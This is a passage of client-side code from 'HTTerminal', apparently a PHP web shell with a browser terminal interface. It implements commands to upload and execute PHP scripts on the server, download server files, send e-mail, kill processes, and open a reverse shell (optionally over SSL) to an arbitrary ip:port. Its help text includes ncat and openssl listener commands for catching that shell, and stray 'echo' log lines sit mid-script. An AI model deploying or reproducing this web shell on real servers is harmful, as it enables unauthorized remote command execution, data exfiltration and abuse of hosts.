                    clientLogTXT("Invalid arguments.login command syntax:</br>login yourpassword Login</br>blank password means it is the first time you are trying to login</br>")
                }
                
                
                break;
                
        case "logout":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            Logout()
            break;
            
        case "setpass":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){
                setpass(argv[1])
                
            }else{
                clientLogTXT("Invalid arguments.setpass command syntax:</br>setpass password  &nbsp;&nbsp;&nbsp;Set or change the password</br>")
                }
                break;
                
        case "start":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            ReverseShell("local","",false)
            break;
            
            
            
        case "upload":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){
                
                UploadFile(argv[1])
                
            }else if(argc==1){
                
                UploadFile("")
                
                }else{
                    clientLogTXT('Invalid arguments.upload command syntax:</br>upload /directory/to/upload Upload your local file to server(choose your file by clicking on "Browse your file...)"</br>blank path means current directory</br>')
                }
                break;
                
                
                
        case "pexec":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            pexec()
            break;
            
            
            
            
            
        case "download":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){
                
                DownloadFromServer(argv[1])
                
            }else{
                clientLogTXT("Invalid arguments.download command syntax:</br>download /path/to/file.txt  &nbsp;&nbsp;&nbsp;Download file from server to local computer</br>")
                }
                break;
                
                
                
                
                
                
        case "sigkill":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            SigKill()
            break;
            
            
        case "bgcolor":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){//Set Background Color
                SetColors(argv[1],"")
                
            }else{
                clientLogTXT("Current background color:"+encodeHTML(BGCOLOR)+"<br>Invalid arguments.bgcolor command syntax:</br>bgcolor color &nbsp;&nbsp;&nbsp;Set terminal background color</br>")
                }
                break;
                
                
        case "txtcolor":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){//Set Text Color
                SetColors("",argv[1])
                
            }else{
                clientLogTXT("Current text color:"+encodeHTML(TXTCOLOR)+"<br>Invalid arguments.txtcolor command syntax:</br>txtcolor color &nbsp;&nbsp;&nbsp;Set terminal text color</br>")
            }
                break;
        


        
        case "txtsize":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){//Set Text Size
                SetFontSize(argv[1])
                
            }else{
                clientLogTXT("Current text color:"+encodeHTML(TXTSIZE)+"<br>Invalid arguments.txtsize command syntax:</br>txtsize size &nbsp;&nbsp;&nbsp;Set Terminal text size</br>")
            }
                break;



				
		case "localhist":
	        clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
			
			if(SaveCommandsToLocalStorage=="y"){
				SaveCommandsToLocalStorage="n";
			    clientLogTXT("Saving commands to browser local storage Disabled.</br>")
			}else{
				SaveCommandsToLocalStorage="y";
				clientLogTXT("Saving commands to browser local storage Enabled.</br>")
			}
            SaveSettingsAndHist("LOCALHIST",SaveCommandsToLocalStorage);//Save mode to local storage if it is supported

		break;
				
                
        case "termreset":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            SetColors("black","white")
			SetFontSize("5vh");
            break;
            
            
        case "scr":
		    clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            if(AutoScroll==true){AutoScroll=false}else{AutoScroll=true};
            break;
			
			
        case "upd":
		    clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            if(AutoUpdate==true){AutoUpdate=false;clientLogTXT("<br>Auto-Updating Disabled.</br>");}else{AutoUpdate=true;clientLogTXT("<br>Auto-Updating Enabled.</br>");};
            break;
            
            
			
			
			
			
        case "mode":
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            ChangeShellMode();
            break;
			
			
		case "ccd":	
		    clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            
            if(argc==2){//change current directory
                CCD(argv[1])
                
            }else{
                clientLogTXT("Invalid arguments.ccd command syntax:</br>ccd /directly/ &nbsp;&nbsp;&nbsp;Chnage current directory</br>")
            }
                break;	

				
				
				
            case "cwd":
			clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            cwd();
            break;



				
            
			
        case "mail":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            


            var from=to=replyto=subject=messagefile=cc=bcc=attachmentfile="";
            var n;
            for (n=1;n< argc;n++) {
                if(argv[n]=="--from" || argv[n]=="-f"){
                    if(argv[n+1]){
                        from=argv[n+1];
                    }
                    
                }else if(argv[n]=="--to" || argv[n]=="-t"){
                    if(argv[n+1]){
                        to=argv[n+1];
                    }
                    
                }else if(argv[n]=="--replyto" || argv[n]=="-r"){
                    if(argv[n+1]){
                        replyto=argv[n+1];
                    }
                    
                }else if(argv[n]=="--subject" || argv[n]=="-s"){
                    if(argv[n+1]){
                        subject=argv[n+1];
                    }
                    
                }else if(argv[n]=="--messagefile" || argv[n]=="-m"){
                    if(argv[n+1]){
                        messagefile=argv[n+1];
                    }
                    
                }else if(argv[n]=="--cc" || argv[n]=="-c"){
                    if(argv[n+1]){
                        cc=argv[n+1];
                    }
                    
                }else if(argv[n]=="--bcc" || argv[n]=="-b"){
                    if(argv[n+1]){
                        bcc=argv[n+1];
                    }
                    
                }else if(argv[n]=="--attachmentfile" || argv[n]=="-a"){
                    if(argv[n+1]){
                        attachmentfile=argv[n+1];
                    }
                    
                }
                
            }
            SendMail(from,to,replyto,subject,messagefile,cc,bcc,attachmentfile)
            break;
            
            
            
        case "rv":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==3 || argc==4){
                var address=argv[1]
                if(!ValidateAddress(address)){
                    clientLogTXT("Error:Address "+encodeHTML(address)+" is not a valid IP/Hostname</br>")
                    return;
                }
                var port=argv[2]
                if(isNaN(port)||port % 1 != 0||port<=0||65536<=port){
                    clientLogTXT("Error:port number "+encodeHTML(port)+" is not a valid port number</br>")
                    return;
                }
                
                
                
                if(argv[3]=="--ssl"){
                    ReverseShell(address,port,true)
                }else{
                    ReverseShell(address,port,false)
                    }
                    
            }else{
                clientLogTXT('Invalid arguments.rv command syntax:</br>rv IpOrHostname port   --ssl&nbsp;&nbsp;&nbsp;Connect back to the ip:port for reverse shell --ssl is optional</br>To listen if you use ssl:<br>openssl req -subj \"/CN=domain.com/O=Yourname/C=US\" -new -newkey rsa:4096 -sha256 -days 10000 -nodes -x509 -keyout ./server.key -out ./server.crt && ncat -l -p PortToListen --ssl --ssl-cert ./server.crt --ssl-key ./server.key</br>if you don\'t want to use ssl:ncat -l -p PortToListen<br>')
            }
            
            
            break;
            
            
            
            
            
        default:
            ServerCommands+=command+"\n"
            SendSTDIN(ServerCommands)
            ServerCommands=""
    }
    
    
}





function ChangeShellMode(){//Switch shell mode (proc_open/command_only)
    HTTPCommunicate("change_shell_mode",'cm=',"")
    
}




function CCD(dir){//function to change current working directly
	
    HTTPCommunicate("ccd",'ccd='+dir,"")
}



function cwd(){//function to get current working
    HTTPCommunicate("cwd",'cwd=',"")
}







function UpKey(){//Function to handle UpKey..Pressing Upkey used to load older commands in the history list
/*
What history list looks like:[TextBoxValueNow,OldestCommand,.....,NewestCommand]
:)

                    %%%%%%%%%%%%%
 ########           %           %                 ______
 #      #           %[DoNothing]%                 |    |
 # [TextBoxValueNow,OldestCommand,.....,NewestCommand] |
 #                       ^                     ^       |
 #                       |                     #       |
 #                       |_____________________#_______|
 #                                             #
 ###############################################

summery:
if index is 0 We are on TextBoxValueNow ==> store textbox value to TextBoxValueNow,Load NewestCommand value to textbox,set index to history array size-1
if index is 1 We are on OldestCommand ==> do nothing
if index is more than 1 We are on (OldestCommand,NewestCommand] ==> store textbox value in item with current index,Load older command value to textbox,set index to index-1

*/
        //HIST2 size is more that 1 means we have (an)older command(s) in histroy list.When history is empty we have just TextBoxValueNow in array and it's size is 1
	if(HIST2.length>1){

		if(HIST_index==0){//Index 0 means browsing history not started and Before browsing history,remember what is in textbox

			HIST2[0]=document.getElementById("inptxt").value//Store textbox value in TextBoxValueNow before browsing

			HIST_index=HIST2.length-1//get index of the NewestCommand in history array and set textbox value to it's value
			document.getElementById("inptxt").value=HIST2[HIST_index]
                        UpdateInputLabelByTextbox()

		}else if(HIST_index!=1){
			/*
			1<index means history index isn't index of the oldest item in the history(OldestCommand).And we will go back in array.
			index=1 means OldestCommand is now in the textbox and there is no older command than it so do nothing
			*/
			HIST2[HIST_index]=document.getElementById("inptxt").value//Store textbox value in item with current index before browsing

			HIST_index=HIST_index-1;//Go back in array
			document.getElementById("inptxt").value=HIST2[HIST_index]//set textbox value to the older command
                        UpdateInputLabelByTextbox()
		}
	}
		document.getElementById('inptxt').focus()//Focus textbox after changing it's value
}







function DownKey(){//Function to handle DownKey..Pressing DownKey used to load the newer commands in the history list
/*
What history list looks like:[TextBoxValueNow,OldestCommand,.....,NewestCommand]
:)

  %%%%%%%%%%%%%
  %           %                                   ______
  %[DoNothing]%                                   |    |
   [TextBoxValueNow,OldestCommand,.....,NewestCommand] |
      ^               #                        ^       |
      |               #                        #       |
      |_______________#________________________#_______|
                      #                        #
                      ##########################

summery:
if index is 0 We are on TextBoxValueNow ==> do nothing
if index is size-1 We are on NewestCommand ==> Store textbox value in item with current index(size-1),Load TextBoxValueNow value to textbox,set index to 0
if index is more than 1 We are on [OldestCommand,NewestCommand) ==> set textbox value to TextBoxValueNow,Load newer command value to textbox,set index to index+1
*/
	//HIST2 size is more that 1 means we have (an)older command(s) in histroy list.When history is empty we have just TextBoxValueNow in array and it's size is 1
	if(HIST2.length>1){
                //We are on NewestCommand.command newer than NewestCommand is command not executed in textbox(TextBoxValueNow).load TextBoxValueNow to textbox
		if(HIST_index==HIST2.length-1){
			HIST2[HIST_index]=document.getElementById("inptxt").value//Store textbox value in item with current index(size-1) before browsing
			HIST_index=0;//set index to 0 means we are on TextBoxValueNow
			document.getElementById("inptxt").value=HIST2[HIST_index]//Load TextBoxValueNow value to textbox
                        UpdateInputLabelByTextbox()
		}else if(HIST_index!=0){//We are on [OldestCommand,NewestCommand).load newer commands while we reach NewestCommand
			HIST2[HIST_index]=document.getElementById("inptxt").value//Store textbox value in item with current index before browsing
			HIST_index=HIST_index+1;//increase index
			document.getElementById("inptxt").value=HIST2[HIST_index]//set textbox value to the newer command
                        UpdateInputLabelByTextbox()
		}
	}
	document.getElementById('inptxt').focus()//Focus textbox after changing it's value
}






function keypress(event){//Function To handle keys pressed
    var KeyCode=event.which || event.keyCode;

	if(KeyCode==38){//KeyCode is 38,Upkey is pressed
		UpKey()
	}else if(KeyCode==40){//KeyCode is 40,DownKey is pressed
		DownKey()
	}

}


function Updator(){//Function to check new results comming from server.be called every n milisecodns
	HTTPCommunicate("update","r=","")
}





function ShowHistory(){//Function to show history list.it's similar to histroy command on Linux.used by "hist" command
	var HistoryToShow=HIST//What HIST Array looks like: [TheOldsetCommandInHistory,...,TheNewestCommandInHistory]
	if(HIST.length>1){//If history is not empty...
		var res='';//res a printable list of history commands and their number
		
		for(var h in HistoryToShow){//For every history item in history list get it's number and it's value and append to res
			res+=parseInt(h)+1+"&nbsp;&nbsp;"+HistoryToShow[h]+"</br>"//"Command number"  "Command value" NewLine
		}
                //print res as this function result
		clientLogTXT("Local commands history:</br>"+res)
		}
}









function ClearHIST(i){//Function to clear histroy of terminal.used by "clearhist" 
    if(i=="all"){
		HIST=[];//Clear HIST
		HIST2=[""];//Clear HIST2
	    SaveSettingsAndHist("HIST",HIST);//Clear HIST from local storage if it is supported
	    HIST_index=0;//Set histroy item index to 0		
    }else{
		
        if(1<=i){//remove the nth item from hist
		HIST.splice(i-1,1);
		HIST2.splice(i,1);
		SaveSettingsAndHist("HIST",HIST);//Clear HIST from local storage if it is supported
		HIST_index=0;//Set histroy item index to 0
		}

	
    }

}




function SetColors(Bgcolor,TXTColor){//Function to set terminal colors.used by "txtcolor" & "bgcolor" commands
	if(Bgcolor!=""){//If Bgcolor is not Empty set terminal background color to Bgcolor
		BGCOLOR=Bgcolor;//set current terminal background color to color was wanted
		document.getElementById("terminal").contentDocument.getElementById('terminal_back').style['background-color']=Bgcolor;//Set terminal background color
		document.getElementById("terminal").contentWindow.document.body.style.backgroundColor=Bgcolor;//Set terminal parent color to the same one for better view

		SaveSettingsAndHist("BGCOLOR",BGCOLOR);//Save terminal background color to local storage if it is supported
	}
	if(TXTColor!=""){//If TXTColor is not Empty set terminal background color to Bgcolor
		TXTCOLOR=TXTColor;//set current terminal text color to color was wanted
		document.getElementById("terminal").contentDocument.getElementById('terminal_back').style['color']=TXTCOLOR;//Set terminal text color
		
		SaveSettingsAndHist("TXTCOLOR",TXTCOLOR);//Save terminal text color to local storage if it is supported
	}
}




function SetFontSize(TxtSize){//Function to set terminal text size.used by "txtsize" command

if(TxtSize!=""){
	TXTSIZE=TxtSize;
	document.getElementById("terminal").contentDocument.getElementById('terminal_back').style['font-size']=TXTSIZE;//Set terminal text size
	SaveSettingsAndHist("TXTSIZE",TXTSIZE);//Save terminal text size to local storage if it is supported
}	
	
}




echo "[syslog]05\n";
function ShowHelp(){//Function to print help message in terminal.Thanks https://wordhtml.com for converting word to html format
var HelpMsg="+-+-+-+-+-+-+-+-+-+-+\n\
|H|T|T|e|r|m|i|n|a|l|\n\
+-+-+-+-+-+-+-+-+-+-+\n\
\n\
Help:\n\
\n\
Click on \"Send\" to run a command\n\
Click on ↑ and ↓ to browse command history\n\
Click on \"Browse your file...\" to choose your file for uploading\n\
\n\
HTTerminal commands:\
helpme                      Show this help\n\
login <YourPassword>        Login\n\
logout                      Logout\n\
setpass                     Set or change the password\n\
mode                        Switch shell mode to (proc_open/command_only)\n\
 proc_open mode:start cmd.exe or shell and handle it\n\
 command_only mode:just send commands and get result,can't read stderr or run-time results\n\
 \n\
start                       Start command-line if mode is proc_open\n\
ccd /directly/              Change current directory path\n\
cwd                         Show current directry path\n\
hist                        Show All History\n\
clearhist <Optional:index>  Clear local command history\n\
 this command with no argument clear all command history\n\
 if you pass index argument,it will remove the history item having the same index\n\
 \"hist\" command prints history list items and indexes\n\
clearterm                   Clear terminal\n\
localhist                  (Enable/Disable) saving commands in the local storage\n\
 (You can disable saving commands may contain sensitive data in your browser storage for more security)\n\
upload /directory/  Upload your local file to server(choose your file by clicking on \"Browse your file...\")\n\
                            blank path means current directory\n\
\n\
download /path/to/file.txt  Download file from server to local computer\n\
                            Setting just filename means download file from current directory\n\
pexec                       Upload and execute a php script(choose your file by clicking on \"Browse your file...\")\n\
\n\
rv ip port --ssl[optional]  Connect back to the ip:port for reverse shell\n\
 for simple reverse shell:   rv ip port\n\
 to listen for it        :   ncat -l -p PortToListen\n\
\n\
 for ssl reverse shell   :   rv ip port --ssl\n\
 to creacet SSL key,\n\
 certificate and listen\n\
 for ssl connection      :   openssl req -subj \"/CN=domain.com/O=Yourname/C=US\" -new -newkey rsa:4096 -sha256 -days 10000 -nodes -x509 -keyout ./server.key -out ./server.crt && ncat -l -p PortToListen --ssl --ssl-cert ./server.crt --ssl-key ./server.key\n\
\n\
mail                        Send E-mails\n\
 --from,-f                  from email address\n\
 --to,-t                    to email address\n\
 --subject,-s               email subject\n\
 --messagefile,-m           message saved in txt or html file\n\
 Optional arguments:\n\
 --replyto,-r               reply-to email address\n\
 --cc,-c                    CC email addresses.Separate email addresses by ,\n\
 --bcc,-b                   BCC email addresses.Separate email addresses by ,\n\
 --attachmentfile,-a        path of attachment file to send\n\
\n\
savetxt                     Download Terminal output as a txt file to local computer\n\
savehtml                    Download Terminal output as a html file to local computer\n\
bgcolor <ColorNameOrCode>   Set Terminal background color and save it\n\
txtcolor <ColorNameOrCode>  Set Terminal text color and save it\n\
 color code is :colorname_rgb(r,g,b)_#HexColoe_hsl(h,s,l)_hwb(h,w,b),...\n\
 examples: \"txtcolor red\" or \"txtcolor rgb(255,0,0)\" or \"txtcolor #ff0000\" or ...\n\
 \n\
txtsize <FontSize>          Set Terminal text size and save it\n\
 you can you CSS units as FontSize\n\
 examples: \"txtsize 12\" or \"txtsize 5vh\" or ...\n\
 \n\
 if you execute txtcolor,bgcolor,txtsize commands without any arguments\n\
 you will get current text and background colors and the text size\n\
  \n\
termreset                   Reset Terminal background and text colors and text size to the default\n\
upd                         Stop/Start auto updating results from server\n\
scr                         Stop/Start auto scrolling\n\
sigkill                     kill shell or cmd.exe session\n\
license                     Show this project license\n\
github                      Open this project page on GitHub\n\
donate                      Donate bitcoin for the project\n\
\n"



         var project_link="<a href='"+ProjectPage+"' target='_blank' style='color: red'>"+ProjectPage+"</a>"
         var donation_link="<a href='"+DonationLink+"' target='_blank' style='color: red'>Donate!</a>"




        HelpMsg="<p>"+encodeHTML(HelpMsg)+encodeHTML("Project page:")+project_link+encodeHTML("\nDonation Link:")+donation_link+encodeHTML("\nBitcoin address:"+DonationAddress)+"</p>"

	clientLogTXT(HelpMsg);
}

















function ShowLicense(){//Function to print This project license on the terminal.Project is released under MIT.Free and Open-Source for ever!
	License="MIT License\n\
\n\
Copyright (c) 2018 0xCoderMan\n\
\n\
Permission is hereby granted, free of charge, to any person obtaining a copy\n\
of this software and associated documentation files (the \"Software\"), to deal\n\
in the Software without restriction, including without limitation the rights\n\
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n\
copies of the Software, and to permit persons to whom the Software is\n\
furnished to do so, subject to the following conditions:\n\
\n\
The above copyright notice and this permission notice shall be included in all\n\
copies or substantial portions of the Software.\n\
\n\
THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n\
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n\
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n\
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n\
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n\
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n\
SOFTWARE.\n\n";
	clientLogTXT(encodeHTML(License));
}




echo "[syslog]06\n";

var CSRF_token='';//Store CSRF token

function HTTPCommunicate(operation,params,MessageArgs){//Function To Have HTTP communication by server
var xhr;
    if (window.XMLHttpRequest) {
         // code for IE7+, Firefox, Chrome, Opera, Safari
         xhr = new XMLHttpRequest();//Define XMLHTTPREQUEST agent
    }
    else {
         // code for IE6, IE5
         xhr = new ActiveXObject("Microsoft.XMLHTTP");
    }


    xhr.open("POST",this.location, true);// xhr.open("POST","", true); Not working on IE 11 :)
    xhr.timeout = 5000;
    xhr.ontimeout=function(){xhr.abort();};
    //for upload and pexec functions Start Progress counter...  Browser will add file the cotent-type if is neccessarry.
    if(operation=="pexec" || operation=="upload"){
        xhr.upload.onprogress = function(e) {
            if (e.lengthComputable) {
                var percentComplete = (e.loaded / e.total) * 100;
                ProgressUpload(percentComplete)
            }
        };
    }else{//Not uploading files.add this header
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
		params+="&token="+CSRF_token//Set CSRF token
		
    }
    
    xhr.onreadystatechange = function(){
        
        if(this.readyState==4){
            if(this.status!=200){
                if(operation!="rv"){
                    clientLogTXT('Error:XMLHTTPRequest error:Operation '+encodeHTML(operation)+' failed.HTTP response code:'+encodeHTML(this.status)+'<br>');
                }
                return;
                
            }//HTTP code is 200 and ok,check if error is occured:
            
            var content_type=xhr.getResponseHeader('content-type')
			var token=xhr.getResponseHeader('CSRF_TOKEN')
			if(token){
			
                CSRF_token=token			
				
			}	
            var message=xhr.responseText;
			message=encodeHTML(message);//Prevent XSS
			
            if(content_type.CrossBrowserstartsWith("text/error")){//Handle Error for every operation...
                
                if(message=="AnOtherIPLoggedIN" || message=="Login" || message=="PasswordParameterNeeded" || message=="PasswordMustNotBeEmpty" || message=="WrongPassword"){
                    
                    if(operation=="login"){//Login error,may be password is wrong.
                        clientLogTXT("Failed to Login. Error messages:"+"<br>"+message+"<br>")
                        return;
                    }
                    
                    clientLogTXT('Error:First Login <br>')
                    return;
                }else if(message=="SetPassword"){
                    clientLogTXT('Error:Your password can not be empty.Set password for your account by setpass<br>')
                    return;
                }




                //Other Errors...
                switch(operation){
                    case "rv"://Reverse shell error can be read by Updator command no need for that here
                        break;
                        
                    case "setpass":
                        clientLogTXT("Failed to Set password. Error messages:"+"<br>"+message+"<br>")
                        break;
                        
                        
                    case "logout":
                        clientLogTXT("Failed to Logout. Error messages:"+"<br>"+message+"<br>")
                        break;
                        
                        
                    case "sendmail":
                        clientLogTXT("Failed to send E-mail Error messages:<br>"+message+"<br>")
                        break;
                        
                        
                    case "sigkill":
                        clientLogTXT("Failed to send killing signal:<br>"+message+"<br>")

                        break;
                        
                        
                    case "pexec":
                        clientLogTXT("failed to execute "+encodeHTML(MessageArgs[0])+"<br>"+message+"<br>")
                        break;
                        
                    case "download":
                        clientLogTXT("Failed to download file "+encodeHTML(MessageArgs[0])+" Error messages:<br>"+message+"<br>")
                        break;
                        
                        
                    case "upload":
                        clientLogTXT("Failed to upload file "+encodeHTML(MessageArgs[1])+" to "+encodeHTML(MessageArgs[0]+MessageArgs[1])+" Error messages:"+"<br>"+message+"<br>")
                        break;
                        
                        
                        
                    default:
                        
                        break;
                        
                        return;
                }
                
            }else{//No error!Process result:...
                switch(operation){
                    case "rv"://Reverse shell result can be read by Updator command no need for that here
                        break;
                        
                    case "setpass":
                        if(message=="NewPasswordSet"){clientLogTXT("Password was set to "+MessageArgs[0]+"<br>Don't Foreget it!<br>")}
                        break;
                        
                    case "logout":
                        clientLogTXT("Logged out<br>")
                        break;
                        
                        
                    case "login":
                        clientLogTXT("Logged in<br>"+message)
                        break;
                        
                        
                    case "sendmail":
                        clientLogTXT("E-mail was successfully sent<br>")
                        break;
                        
                        
                    case "sigkill":
                        clientLogTXT("killing signal was sent<br>")
                        break;
                        
                        
                    case "pexec":
                        clientLogTXT(encodeHTML(MessageArgs[0])+" was Executed<br>result:<br>"+message+"<br>")
                        break;
                        
                        
                    case "update":
                        if(message!=""){
							
							    if(!AutoUpdate){
		                            ServerOuts+=message;
							    }else{
									clientLogTXT(ServerOuts+message);
									ServerOuts='';
								}
                            
                        }
                        break;
                        
                        
                    case "download":
                        var filename=getFileNameByContentDisposition(xhr.getResponseHeader('Content-Disposition'))
                        DownLoadTextToFile(filename,content_type,message)
                        break;
                        
                        
                    case "upload":
                        clientLogTXT("File was uploaded successfully to "+encodeHTML(MessageArgs[0]+MessageArgs[1])+"<br>");
                        break;
                        
                    default:
                        break;
                        
                        return;
                }
                
            }
            
            
        }
        
        
    }
    
    
    
    

	xhr.send(params);	
}








</script>
<body onload="main()" style="" bgcolor="#888a85" onresize=''>
<iframe id="terminal" class="terminal" frameBorder="0" onload="this.contentWindow.scrollTo(0,999999);"></iframe>




<textarea type="text" id="inptxt" autocomplete="off" class="inptxt" oninput="inptxtchange(this.value)" onkeypress="keypress(event)" spellcheck="false"></textarea>

<button id="SendBtn" class="buttons sendButton" onclick="document.getElementById('inptxt').value+='\n';inptxtchange(document.getElementById('inptxt').value);document.getElementById('inptxt').focus();">Send</button>

<button id="UpBtn" class="buttons UpBtn" onclick="UpKey()">&uarr;</button>
<button id="DownBtn" class="buttons DownBtn" onclick="DownKey()">&darr;</button>

<input type="file" id="file" class="FileInput" onchange="OnFileChoose()"/>
<label id="filenamelbl" for="file" class="BrowseLabel">Browse<br>your<br>file...</label>


<?php 